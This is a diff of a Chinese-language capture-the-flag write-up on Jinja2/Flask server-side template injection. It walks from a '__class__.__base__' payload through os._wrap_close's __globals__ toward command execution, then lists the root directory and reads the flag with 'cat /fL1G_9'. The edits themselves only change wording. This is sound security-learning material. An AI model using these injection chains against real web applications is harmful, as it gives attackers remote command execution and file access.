@@ -78,7 +78,7 @@ falsk在开始app.flask实例化时,会创建config对象实例,他的__init__�
 
 首先找基类
 ```python
-{{ ''.__class__.__base__ }}
+{{''.__class__.__base__ }}
 ```
 意思是从一个随便的对象出发,
 class返回他的类
@@ -99,7 +99,7 @@ os._wrap_close.__init__.__globals__
 ```
 好像还是看不懂,别急
 我们想要的是全局命名空间globals里面的, 可以操控文件或者命令执行的函数
-注意,globals取的是: 一个**函数**,它的定义所在的**模块**,的全局命名空间
+注意,globals取的是: 一个**函数**,它的定义所在的**模块**,的全局命名空间(**记录模块中导入的其它模块，定义的全局变量、函数和类**)
 init取表示一个类的构造方法函数
 而这个函数在os.\_wrap_close里定义,os.\_wrap_close这个又是在os模块内定义的
 
@@ -192,7 +192,7 @@ ls -la /
 ```
 我知道了! 答案是 total 60 drwxr-xr-x 1 root root 4096 Aug 18 2025 app lrwxrwxrwx 1 root root 7 May 12 2025 bin -> usr/bin drwxr-xr-x 2 root root 4096 May 12 2025 boot drwxr-xr-x 5 root root 360 Oct 25 13:47 dev drwxr-xr-x 1 root root 4096 Oct 25 13:47 etc -rwxrwxrwx 1 root root 32 Jul 21 2025 fL1G_9 drwxr-xr-x 2 root root 4096 May 12 2025 home lrwxrwxrwx 1 root root 7 May 12 2025 lib -> usr/lib lrwxrwxrwx 1 root root 9 May 12 2025 lib64 -> usr/lib64 drwxr-xr-x 2 root root 4096 Aug 11 2025 media drwxr-xr-x 2 root root 4096 Aug 11 2025 mnt drwxr-xr-x 2 root root 4096 Aug 11 2025 opt dr-xr-xr-x 252 root root 0 Oct 25 13:47 proc drwx------ 1 root root 4096 Aug 18 2025 root drwxr-xr-x 1 root root 4096 Oct 25 13:47 run lrwxrwxrwx 1 root root 8 May 12 2025 sbin -> usr/sbin drwxr-xr-x 2 root root 4096 Aug 11 2025 srv dr-xr-xr-x 13 root root 0 Oct 24 05:52 sys drwxrwxrwt 1 root root 4096 Aug 18 2025 tmp drwxr-xr-x 1 root root 4096 Aug 11 2025 usr drwxr-xr-x 1 root root 4096 Aug 11 2025 var !哼哼, 不愧是我~
 ```
-注意到有一个fL1G_9文件(注意力惊人,其实不用-l显示的话就很清楚了)
+注意到有一个fL1G_9文件(注意力惊人,好吧但其实不用-l显示的话就很清楚了)
 ```shell
 cat /fL1G_9
 ```
@@ -212,3 +212,4 @@ limpsum是jinja2的内置全局函数,可以在任何模板里面使用,所以�
 
 // TODO
 最后贴一个教程,感觉比较全:[ssti入门(原理介绍与常见绕过) - 落山机糊人 - 博客园](https://www.cnblogs.com/lx207/articles/18958248)
+
